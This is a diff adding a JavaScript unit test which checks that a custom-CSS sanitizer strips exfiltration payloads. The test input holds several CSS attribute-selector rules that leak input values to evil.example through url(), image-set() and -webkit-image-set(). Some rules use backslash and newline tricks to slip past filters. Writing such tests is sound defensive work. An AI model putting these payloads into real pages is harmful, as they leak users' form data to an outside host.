@@ -30,3 +30,16 @@ test('buildThemeCss applies sanitization', () => {
   assert.equal(output.includes('p { color: blue; }'), true);
 });
 
+test('sanitizeCustomCss blocks backslash line-continuation, multiline url, and external image-set', () => {
+  const css = [
+    'input[value^="a"] { background: url("ht\\\ntps://evil.example/leak?a"); }',
+    'input[value^="b"] { background: url("https://evil.example/\nleak?b"); }',
+    'input[value^="c"] { background-image: image-set("https://evil.example/c.png" 1x); }',
+    'input[value^="d"] { background-image: -webkit-image-set(url("//evil.example/d.png") 1x); }',
+    'body { background-image: image-set("/api/theme/assets/bg.webp" 1x); }',
+  ].join('\n');
+  const sanitized = sanitizeCustomCss(css);
+  assert.equal(sanitized.includes('evil.example'), false);
+  assert.equal(sanitized.includes('/api/theme/assets/bg.webp'), true);
+});
+
